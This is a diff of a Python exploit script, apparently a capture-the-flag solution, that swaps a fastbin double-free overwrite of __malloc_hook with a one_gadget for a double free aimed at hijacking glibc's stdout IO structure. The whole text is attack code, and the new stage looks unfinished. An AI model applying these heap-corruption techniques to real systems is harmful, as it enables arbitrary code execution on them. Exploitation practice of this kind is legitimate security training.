@@ -59,22 +59,35 @@ if __name__ == "__main__":
     oneGadget = libc.address + oneGadgetOffset
     pause()
 
-    success("Step 2: fastbin attack")
+    #  success("Step 2: fastbin attack")
+    #  #  DEBUG()
+    #  fakeChunk = libc.sym['__malloc_hook'] - 0x23 # size = 0x7f
+    #  Raise(0x60, '3' * 0x60, '3333')
+    #  Raise(0x60, '4' * 0x60, '4444')
+    #  Remove(3)
+    #  Remove(4)
+    #  Remove(3)
+    #  Raise(0x60, p64(fakeChunk), '5555')
+    #  Raise(0x60, '6' * 0x60, '6666')
+    #  Raise(0x60, '7' * 0x60, '7777')
+    #  payload = cyclic(0x13) + p64(oneGadget)
+    
     #  DEBUG()
-    fakeChunk = libc.sym['__malloc_hook'] - 0x23 # size = 0x7f
+    #  Remove(0)
+    #  Remove(0)
+    success("Step 2: hijack IO_File")
+    #  DEBUG()
     Raise(0x60, '3' * 0x60, '3333')
     Raise(0x60, '4' * 0x60, '4444')
-    Remove(3)
-    Remove(4)
-    Remove(3)
-    Raise(0x60, p64(fakeChunk), '5555')
-    Raise(0x60, '6' * 0x60, '6666')
-    Raise(0x60, '7' * 0x60, '7777')
-    payload = cyclic(0x13) + p64(oneGadget)
-    
-    DEBUG()
-    Remove(0)
-    Remove(0)
+    Remove(3) # 3
+    Remove(4) # 4 -> 3
+    Remove(3) # 3 -> 4 -> 3
+    vtable = libc.sym['_IO_2_1_stdout_'] + 0x9d
+    Raise(0x60, vtable, '5555') # 4 -> 3 -> vtable
+    Raise(0x60, '3' * 0x60, '3333') # 3 -> vtable
+    Raise(0x60, '3' * 0x60, '3333') # vtable
+
+
 
     io.interactive()
     io.close()
